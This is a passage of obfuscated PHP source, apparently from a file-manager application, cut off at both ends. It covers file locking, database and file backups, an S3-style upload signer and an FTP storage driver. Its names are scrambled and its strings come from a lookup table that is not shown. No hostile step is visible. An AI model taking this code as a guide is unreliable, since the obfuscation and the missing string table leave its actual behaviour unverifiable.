(self::$lockItem as $¶”“±¬® => $æ©ó˜Ú) { if (!$æ©ó˜Ú) { continue; } $“ñ ‘±æ->unlock($¶”“±¬®); if (!$ºŠÔ®‡Á) { $ºŠÔ®‡Á = !0; write_log($ßŒáÚÅ[946] . $¶”“±¬® . $ßŒáÚÅ[74] . get_caller_msg(), $ßŒáÚÅ[933]); continue; } write_log($ßŒáÚÅ[946] . $¶”“±¬®, $ßŒáÚÅ[933]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¼ôŒ½Ö¯ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ßŒáÚÅ[947] . $¼ôŒ½Ö¯ . $ßŒáÚÅ[948] . ACTION, $ßŒáÚÅ[933]); } } public static function fileLock($ÄÈšÉÎÖ) { $ëã®ó¦½ =& $_SERVER[íïàËŸë]; if (!$GLOBALS[$ëã®ó¦½[949]]) { $GLOBALS[$ëã®ó¦½[949]] = array(); } $GLOBALS[$ëã®ó¦½[949]][$ÄÈšÉÎÖ] = !1; $¸´Íì¿· = fopen(DATA_PATH . $ÄÈšÉÎÖ . $ëã®ó¦½[950], $ëã®ó¦½[951]); if (!$¸´Íì¿·) { return !1; } $GLOBALS[$ëã®ó¦½[949]][$ÄÈšÉÎÖ] = $¸´Íì¿·; if (flock($¸´Íì¿·, LOCK_EX)) { return !0; } self::unlock($ÄÈšÉÎÖ); show_json($ëã®ó¦½[952], !1); return !1; } public static function fileUnlock($Á©¾ôø¦) { $“äášìŒ =& $_SERVER[íïàËŸë]; $»Œì®¼¥ = $GLOBALS[$“äášìŒ[949]][$Á©¾ôø¦]; if (!$»Œì®¼¥) { return; } $GLOBALS[$“äášìŒ[949]][$Á©¾ôø¦] = !1; flock($»Œì®¼¥, LOCK_UN); fclose($»Œì®¼¥); } public static function fileUnlockAll() { $î¢”ôø¯ =& $_SERVER[íïàËŸë]; if (!isset($GLOBALS[$î¢”ôø¯[949]]) || !$GLOBALS[$î¢”ôø¯[949]]) { return; } foreach ($GLOBALS[$î¢”ôø¯[949]] as $óõÂ“õÃ => $¦Ó®ğÍ) { if (!$¦Ó®ğÍ) { continue; } $GLOBALS[$î¢”ôø¯[949]][$óõÂ“õÃ] = !1; flock($¦Ó®ğÍ, LOCK_UN); fclose($¦Ó®ğÍ); } $GLOBALS[$î¢”ôø¯[949]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto EŠó¤Ëí; aÆèŠ‚“¢³: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[íïàËŸë][831]); $this->init(); $this->keep(); } public function init() { $ı‹‚ùÔÎ =& $_SERVER[íïàËŸë]; $this->isManual(); self::$name = date($ı‹‚ùÔÎ[832]); if (!($²–Ô¥ä = $this->model->lastItem())) { $²–Ô¥ä = $this->initData(); } else { self::$name = $²–Ô¥ä[$ı‹‚ùÔÎ[32]]; if ($²–Ô¥ä[$ı‹‚ùÔÎ[833]] == $ı‹‚ùÔÎ[91]) { self::$name = date($ı‹‚ùÔÎ[272]); $ô‚ì¾„À = intval(_get($²–Ô¥ä, $ı‹‚ùÔÎ[834], 0)); if (self::$manual == 0 && $²–Ô¥ä[$ı‹‚ùÔÎ[32]] == self::$name) { $this->model->remove($²–Ô¥ä[$ı‹‚ùÔÎ[475]]); } $²–Ô¥ä = $this->initData($ô‚ì¾„À, $²–Ô¥ä[$ı‹‚ùÔÎ[835]]); } else { $this->checkStore($²–Ô¥ä[$ı‹‚ùÔÎ[835]]); } } self::$option = $²–Ô¥ä; } private function isManual() { $›¤ë¤ğ­ = _get($GLOBALS, $_SERVER[íïàËŸë][836], 0); $›¤ë¤ğ­ = intval($›¤ë¤ğ­); self::$manual = $›¤ë¤ğ­ && $›¤ë¤ğ­ == 1 ? 1 : 0; } private function initData($‡ıâôŸî = 0, $Ó¸¾ëµ = '') { $‘üÌ»Í² =& $_SERVER[íïàËŸë]; $¼şğ«¨ = $this->model->config(); if ($Ó¸¾ëµ && $¼şğ«¨[$‘üÌ»Í²[835]] != $Ó¸¾ëµ) { $‡ıâôŸî = 0; } $this->checkStore($¼şğ«¨[$‘üÌ»Í²[835]]); if (self::$manual == 1) { self::$name .= $‘üÌ»Í²[11] . date($‘üÌ»Í²[837]); } $ØƒÕÓ¾× = array($‘üÌ»Í²[835] => $¼şğ«¨[$‘üÌ»Í²[835]], $‘üÌ»Í²[32] => self::$name, $‘üÌ»Í²[833] => 0, $‘üÌ»Í²[171] => $¼şğ«¨[$‘üÌ»Í²[171]], $‘üÌ»Í²[838] => self::$manual, $‘üÌ»Í²[369] => array($‘üÌ»Í²[839] => array($‘üÌ»Í²[833] => 0), $‘üÌ»Í²[840] => array($‘üÌ»Í²[833] => 0, $‘üÌ»Í²[841] => 0, $‘üÌ»Í²[842] => 0, $‘üÌ»Í²[33] => $‘üÌ»Í²[12], $‘üÌ»Í²[843] => 0, $‘üÌ»Í²[844] => 0), $‘üÌ»Í²[845] => array($‘üÌ»Í²[833] => 0, $‘üÌ»Í²[841] => 0, $‘üÌ»Í²[842] => 0, $‘üÌ»Í²[843] => 0, $‘üÌ»Í²[844] => 0), $‘üÌ»Í²[230] => array($‘üÌ»Í²[833] => 0, $‘üÌ»Í²[846] => 0, $‘üÌ»Í²[847] => 0, $‘üÌ»Í²[848] => 0, $‘üÌ»Í²[849] => 0, $‘üÌ»Í²[541] => $‡ıâôŸî, $‘üÌ»Í²[843] => 0, $‘üÌ»Í²[844] => 0)), $‘üÌ»Í²[843] => time(), $‘üÌ»Í²[844] => 0); $“Ê½“Á” = $this->model->insert($ØƒÕÓ¾×); $ØƒÕÓ¾×[$‘üÌ»Í²[475]] = $“Ê½“Á”; return $ØƒÕÓ¾×; } private function checkStore($ºË£¹) { $î¿èÏÆ² = Model($_SERVER[íïàËŸë][850]); $º²«ŠÙ¡ = $î¿èÏÆ²->listData($ºË£¹); $î¿èÏÆ²->checkConfig($º²«ŠÙ¡); } public static function get() { if (!self::$option) { $ ªå•ô = Model($_SERVER[íïàËŸë][831]); $¬—ôºÚ = $ ªå•ô->findByName(self::$name); $ ªå•ô->parseContent($¬—ôºÚ); self::$option = $¬—ôºÚ; } return self::$option; } public static function set($ö¢²Â¯Á) { $ççÉ¤‡Ù =& $_SERVER[íïàËŸë]; $çº‡§Î´ = self::get(); foreach ($ö¢²Â¯Á as $“ÉææŠ‰ => $â¢›õ¥Ş) { array_set_value($çº‡§Î´, $“ÉææŠ‰, $â¢›õ¥Ş); } Model($ççÉ¤‡Ù[831])->update($çº‡§Î´[$ççÉ¤‡Ù[475]], $çº‡§Î´); self::$option = $çº‡§Î´; return self::$option; } public function keep() { $®ØÚì =& $_SERVER[íïàËŸë]; $Ã¼¾ñ‡ô = self::get(); if (_get($Ã¼¾ñ‡ô, $®ØÚì[851], 0) == $®ØÚì[91]) { return; } $this->backupKeep($Ã¼¾ñ‡ô); self::set(array($®ØÚì[851] => 1)); } private function backupKeep($É„â«¢Ñ) { $½‹ıı­ä =& $_SERVER[íïàËŸë]; if (self::$manual == 1) { return; } $¬úè’´ = $this->model->listData(); if (empty($¬úè’´)) { return; } $ıöĞÑèŞ = 0; $úçÎ¼¬ê = array(); foreach ($¬úè’´ as $ŒÆµâÃ) { if ($ıöĞÑèŞ >= 7) { break; } $úçÎ¼¬ê[] = $ŒÆµâÃ[$½‹ıı­ä[32]]; $ıöĞÑèŞ++; } for ($ıöĞÑèŞ = 0; $ıöĞÑèŞ < 12; $ıöĞÑèŞ++) { $úçÎ¼¬ê[] = date($½‹ıı­ä[852], strtotime("\x2d{$ıöĞÑèŞ}\x20\155\157\156\164\150\163")); } $úçÎ¼¬ê = array_unique($úçÎ¼¬ê); $ê¸ÉœıÉ = Model($½‹ıı­ä[853])->get($½‹ıı­ä[854]); foreach ($¬úè’´ as $ŒÆµâÃ) { if (isset($ŒÆµâÃ[$½‹ıı­ä[838]]) && $ŒÆµâÃ[$½‹ıı­ä[838]] == $½‹ıı­ä[91]) { continue; } if (!empty($ŒÆµâÃ[$½‹ıı­ä[32]]) && in_array($ŒÆµâÃ[$½‹ıı­ä[32]], $úçÎ¼¬ê)) { continue; } $this->model->remove($ŒÆµâÃ[$½‹ıı­ä[475]]); $ŠğËÁ¯‘ = $this->backupPath($É„â«¢Ñ, $ê¸ÉœıÉ); IO::remove($ŠğËÁ¯‘, !1); } } private function backupPath($­û³£š, $¸¶›û  = false) { $áçÑì‰¥ =& $_SERVER[íïàËŸë]; if (!$¸¶›û ) { $¸¶›û  = Model($áçÑì‰¥[853])->get($áçÑì‰¥[854]); } $ğ¡Ó½‡Ê = $­û³£š[$áçÑì‰¥[32]]; $‘¢±Èòé = substr(md5($áçÑì‰¥[855] . $¸¶›û  . $ğ¡Ó½‡Ê), 0, 8); return "\173\x69\157\72{$­û³£š[$áçÑì‰¥[835]]}\175\x2f\144\x61\x74\x61\142\141\x73\x65\x2f\142\141\143\153\x75\x70\x2f" . $ğ¡Ó½‡Ê . $áçÑì‰¥[11] . $‘¢±Èòé; } public function db() { $¦¶çüå =& $_SERVER[íïàËŸë]; $»ª¤µƒÃ = self::get(); if (_get($»ª¤µƒÃ, $¦¶çüå[856], 0) == $¦¶çüå[91]) { return !0; } $à’¢‚ûß = new BackupDb(); if (!$à’¢‚ûß->index()) { return !1; } self::set(array($¦¶çüå[856] => 1)); return !0; } public function dbFile() { $ä¡¶Œ« =& $_SERVER[íïàËŸë]; $€£ğ¡õ¦ = self::get(); if (_get($€£ğ¡õ¦, $ä¡¶Œ«[857], 0) == $ä¡¶Œ«[91]) { return !0; } $¢ÕÏäÕ¢ = new BackupDbFile(); if (!$¢ÕÏäÕ¢->index()) { return !1; } self::set(array($ä¡¶Œ«[857] => 1)); return !0; } public function file() { $ĞÛ¿öìˆ =& $_SERVER[íïàËŸë]; $†Ò‰ı­Õ = self::get(); if (_get($†Ò‰ı­Õ, $ĞÛ¿öìˆ[858], 0) == $ĞÛ¿öìˆ[91]) { return !0; } if ($†Ò‰ı­Õ[$ĞÛ¿öìˆ[171]] == $ĞÛ¿öìˆ[859]) { $‘ã™À–÷ = new BackupFile(); if (!$‘ã™À–÷->index()) { return !1; } } self::set(array($ĞÛ¿öìˆ[858] => 1, $ĞÛ¿öìˆ[833] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $æãĞÖì =& $_SERVER[íïàËŸë]; $¨¹–±–õ = Backup::get(); self::$io = $¨¹–±–õ[$æãĞÖì[835]]; self::$name = $¨¹–±–õ[$æãĞÖì[32]]; $„¢ù“ı® = new DbManage(); $Ù¸óÅ—ã = $„¢ù“ı®->dbType(); $Ê¬«ç·´ = array($æãĞÖì[860] => $Ù¸óÅ—ã, $æãĞÖì[861] => time()); Backup::set($Ê¬«ç·´); $ÁŸÛôû’ = $this->tmpFilesPath() . $æãĞÖì[862] . self::$name . $æãĞÖì[8]; del_dir($ÁŸÛôû’); mk_dir($ÁŸÛôû’); $·­ÜƒƒË = $ûïåîœø = 0; try { $Ï·ãô = $„¢ù“ı®->db()->getTables(); } catch (Exception $—÷ƒº) { return !1; } $Ï·ãô = array_diff($Ï·ãô, array($æãĞÖì[863], $æãĞÖì[864])); foreach ($Ï·ãô as $Æ¸ˆ›±) { $·­ÜƒƒË += $„¢ù“ı®->model($Æ¸ˆ›±)->count(); } $İ‘é˜È¡ = new Task($æãĞÖì[865], $æãĞÖì[866], $·­ÜƒƒË, LNG($æãĞÖì[867]) . $æãĞÖì[868] . LNG($æãĞÖì[869])); $GLOBALS[$æãĞÖì[870]] = self::$name; foreach ($Ï·ãô as $Æ¸ˆ›±) { $ıß©”Ïğ = $ÁŸÛôû’ . $Æ¸ˆ›± . $æãĞÖì[871]; $ìáØµÑ = null; if ($Æ¸ˆ›± == $æãĞÖì[872] && (!isset($¨¹–±–õ[$æãĞÖì[171]]) || $¨¹–±–õ[$æãĞÖì[171]] == $æãĞÖì[228])) { $ìáØµÑ = self::$io; } $ûïåîœø += $„¢ù“ı®->sqlFromDb($Æ¸ˆ›±, $ıß©”Ïğ, $İ‘é˜È¡, $ìáØµÑ); } unset($GLOBALS[$æãĞÖì[870]]); $İ‘é˜È¡->end(); if ($ûïåîœø > $·­ÜƒƒË) { $·­ÜƒƒË = $ûïåîœø; } $Ê¬«ç·´ = array($æãĞÖì[860] => $Ù¸óÅ—ã, $æãĞÖì[856] => 1, $æãĞÖì[873] => $·­ÜƒƒË, $æãĞÖì[874] => $ûïåîœø, $æãĞÖì[875] => time()); Backup::set($Ê¬«ç·´); if ($·­ÜƒƒË - $ûïåîœø > 0) { $ÕÜ³û“Å = $æãĞÖì[876]; if (!stristr(I18n::getType(), $æãĞÖì[877])) { $ÕÜ³û“Å = $æãĞÖì[878]; } write_log(array($ÕÜ³û“Å, $Ê¬«ç·´), $æãĞÖì[866]); return !1; } return !0; } private function tmpFilesPath() { $Çµ…ˆÍ± =& $_SERVER[íïàËŸë]; $€Â¦¤’Ë = TEMP_FILES; if ($GLOBALS[$Çµ…ˆÍ±[6]][$Çµ…ˆÍ±[92]][$Çµ…ˆÍ±[879]]) { $€Â¦¤’Ë = $GLOBALS[$Çµ…ˆÍ±[6]][$Çµ…ˆÍ±[92]][$Çµ…ˆÍ±[879]]; if (!mk_dir($€Â¦¤’Ë) || !is_writable($€Â¦¤’Ë) || !IO::mkfile($€Â¦¤’Ë . $Çµ…ˆÍ±[880])) { $€Â¦¤’Ë = TEMP_FILES; } } return $€Â¦¤’Ë; } } class BackupDbFile { public function __construct() { } public function index() { $õ¢Æ”Î =& $_SERVER[íïàËŸë]; $×Ğ€ãÑº = Backup::get(); $şü”›» = $×Ğ€ãÑº[$õ¢Æ”Î[32]]; $ö·€£‘š = $this->tmpFilesPath() . "\142\x61\x63\x6b\165\160\x5f{$şü”›»}\57"; $Õƒë€Í = $this->backupPath($×Ğ€ãÑº); if (!($Õƒë€Í = IO::mkdir($Õƒë€Í))) { return !1; } $óš´Ù±´ = IO::listPath($ö·€£‘š); $¦’ƒÇÂ = isset($óš´Ù±´[$õ¢Æ”Î[86]]) ? $óš´Ù±´[$õ¢Æ”Î[86]] : array(); $Ñ¿“ş¡‚ = array_sum(array_column($¦’ƒÇÂ, $õ¢Æ”Î[79])); if (!$Ñ¿“ş¡‚) { return !1; } $â’£á±ü = array($õ¢Æ”Î[881] => $Ñ¿“ş¡‚, $õ¢Æ”Î[882] => time()); Backup::set($â’£á±ü); $øúÍÂŸ = new TaskFileTransfer($õ¢Æ”Î[883], $õ¢Æ”Î[866], count($¦’ƒÇÂ), LNG($õ¢Æ”Î[867]) . $õ¢Æ”Î[462] . LNG($õ¢Æ”Î[869]) . $õ¢Æ”Î[884]); $øúÍÂŸ->task[$õ¢Æ”Î[846]] = $Ñ¿“ş¡‚; foreach ($óš´Ù±´[$õ¢Æ”Î[86]] as $­—Êã„Ë) { $”«¿âú = IO::move($­—Êã„Ë[$õ¢Æ”Î[87]], $Õƒë€Í); if (!$”«¿âú) { $øúÍÂŸ->end(); $‰Ñ½¢Î™ = IO::getLastError($õ¢Æ”Î[885] . $­—Êã„Ë[$õ¢Æ”Î[87]] . $õ¢Æ”Î[886] . $Õƒë€Í . $õ¢Æ”Î[178]); write_log($‰Ñ½¢Î™, $õ¢Æ”Î[866]); return !1; } } $¯ÖÅ­Ì = new DbManage(); $ÈÊñ» = $¯ÖÅ­Ì->getSqlFile(); if (!$ÈÊñ»[$õ¢Æ”Î[887]] || !$ÈÊñ»[$õ¢Æ”Î[13]]) { return !1; } IO::move($ÈÊñ»[$õ¢Æ”Î[887]], $Õƒë€Í); IO::move($ÈÊñ»[$õ¢Æ”Î[13]], $Õƒë€Í); $øúÍÂŸ->end(); $â’£á±ü = array($õ¢Æ”Î[888] => $Ñ¿“ş¡‚, $õ¢Æ”Î[889] => time()); Backup::set($â’£á±ü); return !0; } private function backupPath($›™£¹¬) { $‚¡“»‰¼ =& $_SERVER[íïàËŸë]; $Éêá = $›™£¹¬[$‚¡“»‰¼[32]]; $íõ”ßŞé = Model($‚¡“»‰¼[853])->get($‚¡“»‰¼[854]); $÷‰Îºë„ = substr(md5($‚¡“»‰¼[855] . $íõ”ßŞé . $Éêá), 0, 8); return "\x7b\x69\157\x3a{$›™£¹¬[$‚¡“»‰¼[835]]}\175\57\x64\141\164\x61\x62\x61\x73\x65\x2f\142\141\143\153\x75\160\x2f" . $Éêá . $‚¡“»‰¼[11] . $÷‰Îºë„; } private function tmpFilesPath() { $û’Îø¼Š =& $_SERVER[íïàËŸë]; $§À¿ã™¢ = TEMP_FILES; if ($GLOBALS[$û’Îø¼Š[6]][$û’Îø¼Š[92]][$û’Îø¼Š[879]]) { $§À¿ã™¢ = $GLOBALS[$û’Îø¼Š[6]][$û’Îø¼Š[92]][$û’Îø¼Š[879]]; if (!mk_dir($§À¿ã™¢) || !is_writable($§À¿ã™¢) || !IO::mkfile($§À¿ã™¢ . $û’Îø¼Š[880])) { $§À¿ã™¢ = TEMP_FILES; } } return $§À¿ã™¢; } } goto Bíƒ¦‡òÆƒ; Eº£áƒØ²ê: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($şÄ¢„º) { parent::__construct($şÄ¢„º); $this->setSignVersion($_SERVER[íïàËŸë][247]); } public function uploadFormData($èÃƒãêµ, $ìºÊØÆô = 3600) { $±ªÃÊ§ =& $_SERVER[íïàËŸë]; $¾áª¼Š = $±ªÃÊ§[229]; $Åä™ö = $±ªÃÊ§[270]; $ç‡­õ˜ = $±ªÃÊ§[62]; $³óòªÎ = gmdate($±ªÃÊ§[271]); $¬ëØˆ¡ = gmdate($±ªÃÊ§[272]); $ù•ÔÊİÙ = $±ªÃÊ§[273]; $Üµ¤„È¹ = $ìºÊØÆô . $±ªÃÊ§[12]; $Ê£÷ä¹Ô = $±ªÃÊ§[274]; $ç¸ ŞÑ = array($this->accessKey, $¬ëØˆ¡, $this->region, $ç‡­õ˜, $ù•ÔÊİÙ); $¨ÊÇéÉ = implode($±ªÃÊ§[8], $ç¸ ŞÑ); $¾ô¸‰ø = array($±ªÃÊ§[275] => gmdate($±ªÃÊ§[299], strtotime($±ªÃÊ§[277])), $±ªÃÊ§[278] => array(array($±ªÃÊ§[279] => $this->bucket), array($±ªÃÊ§[280] => $¾áª¼Š), array($±ªÃÊ§[281], $±ªÃÊ§[282], $±ªÃÊ§[12]), array($±ªÃÊ§[281], $±ªÃÊ§[283], $±ªÃÊ§[12]), array($±ªÃÊ§[281], $±ªÃÊ§[284], $±ªÃÊ§[12]), array($±ªÃÊ§[285] => $Ê£÷ä¹Ô), array($±ªÃÊ§[286] => $¨ÊÇéÉ), array($±ªÃÊ§[287] => $Åä™ö), array($±ªÃÊ§[288] => $³óòªÎ), array($±ªÃÊ§[289] => $Üµ¤„È¹))); $Ö³ûÜöŒ = base64_encode(json_encode($¾ô¸‰ø)); $³ñìÀøï = hash_hmac($±ªÃÊ§[290], $¬ëØˆ¡, $±ªÃÊ§[291] . $this->secret, !0); $¤‹Ò³•û = hash_hmac($±ªÃÊ§[290], $this->region, $³ñìÀøï, !0); $åšé€œÄ = hash_hmac($±ªÃÊ§[290], $ç‡­õ˜, $¤‹Ò³•û, !0); $ç‚ıû×ö = hash_hmac($±ªÃÊ§[290], $ù•ÔÊİÙ, $åšé€œÄ, !0); $î•áğØ® = hash_hmac($±ªÃÊ§[290], $Ö³ûÜöŒ, $ç‚ıû×ö); $¤¦øÜï = array($±ªÃÊ§[246] => $±ªÃÊ§[12], $±ªÃÊ§[292] => $±ªÃÊ§[12], $±ªÃÊ§[280] => $¾áª¼Š, $±ªÃÊ§[285] => $Ê£÷ä¹Ô, $±ªÃÊ§[293] => $Ö³ûÜöŒ, $±ªÃÊ§[294] => $¨ÊÇéÉ, $±ªÃÊ§[295] => $Åä™ö, $±ªÃÊ§[296] => $³óòªÎ, $±ªÃÊ§[297] => $Üµ¤„È¹, $±ªÃÊ§[298] => $î•áğØ®, $±ªÃÊ§[208] => $this->getHost()); return $¤¦øÜï; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($Ôšò÷£ü) { parent::__construct(); if (count($Ôšò÷£ü) > 0) { $this->_init($Ôšò÷£ü); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($×å‘«î) { $¯û‹†‹ù =& $_SERVER[íïàËŸë]; global $config; $this->appCharset = $config[$¯û‹†‹ù[1446]]; $this->systemCharset = $config[$¯û‹†‹ù[1447]]; if (isset($×å‘«î[$¯û‹†‹ù[1448]]) && $×å‘«î[$¯û‹†‹ù[1448]]) { $this->systemCharset = $×å‘«î[$¯û‹†‹ù[1448]]; } } public function iconvApp($®Ï‡½ğÖ) { return $this->iconvTo($®Ï‡½ğÖ, $this->systemCharset, $this->appCharset); } public function iconvSystem($ç¡³§ÉÚ) { return $this->iconvTo($ç¡³§ÉÚ, $this->appCharset, $this->systemCharset); } public function getPathOuter($ÄŸá†ã†) { $âñ‹ı™Æ =& $_SERVER[íïàËŸë]; $Áàğª„³ = $this->iconvApp($this->pathBase); $ÄŸá†ã† = $this->iconvApp($ÄŸá†ã†); if (substr($Áàğª„³, 0, 2) == $âñ‹ı™Æ[1449]) { $Áàğª„³ = BASIC_PATH . substr($Áàğª„³, 2); } if (substr($ÄŸá†ã†, 0, 2) == $âñ‹ı™Æ[1449]) { $ÄŸá†ã† = BASIC_PATH . substr($ÄŸá†ã†, 2); } $Áàğª„³ = KodIO::clear($Áàğª„³); $ÄŸá†ã† = KodIO::clear($ÄŸá†ã†); $ÄŸá†ã† = substr($ÄŸá†ã†, strlen($Áàğª„³)); if (empty($this->pathDriver)) { return $ÄŸá†ã†; } return $this->pathDriver . $âñ‹ı™Æ[8] . ltrim($ÄŸá†ã†, $âñ‹ı™Æ[8]); } private function _init($ÃŞÄà½Í = array()) { $¥¦¶¤­Š =& $_SERVER[íïàËŸë]; if (!function_exists($¥¦¶¤­Š[1450])) { throw new Exception(LNG($¥¦¶¤­Š[1451])); } $this->config = $ÃŞÄà½Í; $this->charsetReset($ÃŞÄà½Í); foreach ($ÃŞÄà½Í as $­ôÔ«ñ˜ => $ÒÏ¸ÌĞ¯) { if (isset($this->{$­ôÔ«ñ˜})) { $this->{$­ôÔ«ñ˜} = $ÒÏ¸ÌĞ¯; } } return $this->_login($ÃŞÄà½Í); } private function _login($¸ë†äĞŒ) { $Ş™°­ıô =& $_SERVER[íïàËŸë]; static $™ÖœÓ¸Ô = array(); $áœıÌ× = md5(json_encode($¸ë†äĞŒ)); if (isset($™ÖœÓ¸Ô[$áœıÌ×])) { foreach ($™ÖœÓ¸Ô[$áœıÌ×] as $°—ŒÌõú => $ÆïÚğ) { $this->{$°—ŒÌõú} = $ÆïÚğ; } return !0; } $†‰ÜÆ¡Ì = parse_url(trim($this->server, $Ş™°­ıô[8])); $this->host = $†‰ÜÆ¡Ì[$Ş™°­ıô[208]]; $âËòŠÎá = isset($†‰ÜÆ¡Ì[$Ş™°­ıô[207]]) && $†‰ÜÆ¡Ì[$Ş™°­ıô[207]] == $Ş™°­ıô[1452] ? !0 : !1; $this->scheme = $âËòŠÎá ? $Ş™°­ıô[1453] : $Ş™°­ıô[1454]; $this->port = isset($†‰ÜÆ¡Ì[$Ş™°­ıô[209]]) ? $†‰ÜÆ¡Ì[$Ş™°­ıô[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($Ş™°­ıô[1455]) . $this->host . $Ş™°­ıô[4] . $this->port, !0); return !1; } $ÊÎµñ”„ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$ÊÎµñ”„) { $this->writeLog(LNG($Ş™°­ıô[1456]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $é¥š´• = $this->pasv == $Ş™°­ıô[91] ? !0 : !1; @ftp_pasv($this->connect, $é¥š´•); $™ÖœÓ¸Ô[$áœıÌ×] = array($Ş™°­ıô[1457] => $this->connect, $Ş™°­ıô[208] => $this->host, $Ş™°­ıô[207] => $this->scheme, $Ş™°­ıô[209] => $this->port); return $ÊÎµñ”„; } private function _isconn($˜…´İµ¸ = true) { if (is_resource($this->connect)) { return !0; } if (!$˜…´İµ¸) { return !1; } return $this->_login($this->config); } public function mkfile($«éØõ…ğ, $¡“ĞØàÚ = '', $ÚĞÕİã³ = REPEAT_RENAME) { if ($this->setContent($«éØõ…ğ, $¡“ĞØàÚ)) { return $this->getPathOuter($«éØõ…ğ); } $this->writeLog(LNG($_SERVER[íïàËŸë][1458]), !0); return !1; } public function mkdir($³ş¼ÂØ…, $âø…–òä = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $³ş¼ÂØ… = $this->iconvSystem($³ş¼ÂØ…); if ($this->_isFolder($³ş¼ÂØ…) || @ftp_mkdir($this->connect, $³ş¼ÂØ…)) { return $this->getPathOuter($³ş¼ÂØ…); } if (!$this->mkdir($this->pathFather($³ş¼ÂØ…))) { return !1; } if ($³ş¼ÂØ… = @ftp_mkdir($this->connect, $³ş¼ÂØ…)) { return $this->getPathOuter($³ş¼ÂØ…); } $this->writeLog(__FUNCTION__ . $_SERVER[íïàËŸë][1459], !0); return !1; } public function copyFile($¦£ìƒü›, $íä­„˜) { if (!$this->_isconn()) { return !1; } $Ä°ùˆû¢ = $this->pathThis($this->iconvSystem($¦£ìƒü›)); $®ì¤ªñ¬ = $this->tempFile($Ä°ùˆû¢); $–ó¿§ò» = $this->iconvApp($®ì¤ªñ¬); $this->download($¦£ìƒü›, $–ó¿§ò»); $Ğ´çíéê = $this->upload($íä­„˜, $–ó¿§ò»); $this->tempFileRemve($®ì¤ªñ¬); return $Ğ´çíéê; } public function moveFile($¨²•¥Á, $©×‚›¯‚) { if (!$this->_isconn()) { return !1; } $¨²•¥Á = $this->iconvSystem($¨²•¥Á); $©×‚›¯‚ = $this->iconvSystem($©×‚›¯‚); $áï‚£€÷ = @ftp_rename($this->connect, $¨²•¥Á, $©×‚›¯‚); if (!$áï‚£€÷) { $this->writeLog(__FUNCTION__ . $_SERVER[íïàËŸë][1459], !0); return !1; } return $this->getPathOuter($©×‚›¯‚); } public function delFile($“¯®…») { if (!$this->_isconn()) { return !1; } $“¯®…» = $this->iconvSystem($“¯®…»); $Á¢Éçôœ = @ftp_delete($this->connect, $“¯®…»); if (!$Á¢Éçôœ) { $this->writeLog(__FUNCTION__ . $_SERVER[íïàËŸë][1459], !0); } return $Á¢Éçôœ; } public function delFolder($ÀÆ²Ñ³ª) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¼·ˆ Çà = $ÑµÅÒ‹€ = array(); $this->fileList($ÀÆ²Ñ³ª, $¼·ˆ Çà, $ÑµÅÒ‹€, !0); $this->listItemCache = !0; foreach ($ÑµÅÒ‹€ as $Ûãˆ—£¦) { $ßå€öã = $this->iconvSystem($Ûãˆ—£¦[$_SERVER[íïàËŸë][32]]); $å‘°ûØÄ = @ftp_delete($this->connect, $ßå€öã); if (!$å‘°ûØÄ) { return !1; } } foreach ($¼·ˆ Çà as $ßå€öã) { $ßå€öã = $this->iconvSystem($ßå€öã); $å‘°ûØÄ = @ftp_rmdir($this->connect, $ßå€öã); if (!$å‘°ûØÄ) { return !1; } } $ÀÆ²Ñ³ª = $this->iconvSystem($ÀÆ²Ñ³ª); return @ftp_rmdir($this->connect, $ÀÆ²Ñ³ª); } public function rename($öŸşà…™, $§¼¤¨¤) { $çĞõÊÜô =& $_SERVER[íïàËŸë]; if (!$this->_isconn()) { return !1; } $Â¤şıŠå = $this->fileNameAuto($this->pathFather($öŸşà…™), $§¼¤¨¤); $Â¤şıŠå = $this->iconvSystem($Â¤şıŠå); $öŸşà…™ = $this->iconvSystem($öŸşà…™); $ëËü…üÁ = $this->pathFather($öŸşà…™); $šä£‰ê = rtrim($ëËü…üÁ, $çĞõÊÜô[8]) . $çĞõÊÜô[8] . $Â¤şıŠå; $…œÁ–¦— = @ftp_rename($this->connect, $öŸşà…™, $šä£‰ê); if (!$…œÁ–¦—) { $this->writeLog(__FUNCTION__ . $çĞõÊÜô[1459], !0); return !1; } $šä£‰ê = $this->iconvApp($šä£‰ê); return $this->getPathOuter($šä£‰ê); } private function folderInfo($°Ï“¦„, $²á÷²æ® = false) { $ûÔ‹½Üá =& $_SERVER[íïàËŸë]; $¶è³€®é = array($ûÔ‹½Üá[32] => $this->pathThis($°Ï“¦„), $ûÔ‹½Üá[87] => $this->getPathOuter($ûÔ‹½Üá[8] . $°Ï“¦„), $ûÔ‹½Üá[33] => $ûÔ‹½Üá[78]); if ($²á÷²æ®) { return $¶è³€®é; } $¶è³€®é[$ûÔ‹½Üá[231]] = $¶è³€®é[$ûÔ‹½Üá[88]] = 0; $¶è³€®é[$ûÔ‹½Üá[232]] = $¶è³€®é[$ûÔ‹½Üá[233]] = !0; return $¶è³€®é; } private function fileInfo($éÑ†ëì£, $ÒÆÃ‹‹ = false, $Àî“åè = array()) { $êµ’«ñò =& $_SERVER[íïàËŸë]; $ëƒ¾ãÑ“ = array($êµ’«ñò[32] => $this->pathThis($éÑ†ëì£), $êµ’«ñò[87] => $this->getPathOuter($êµ’«ñò[8] . $éÑ†ëì£), $êµ’«ñò[33] => $êµ’«ñò[230], $êµ’«ñò[79] => isset($Àî“åè[$êµ’«ñò[79]]) ? $Àî“åè[$êµ’«ñò[79]] : 0, $êµ’«ñò[169] => $this->ext($éÑ†ëì£)); if ($ÒÆÃ‹‹) { return $ëƒ¾ãÑ“; } $ëƒ¾ãÑ“[$êµ’«ñò[231]] = 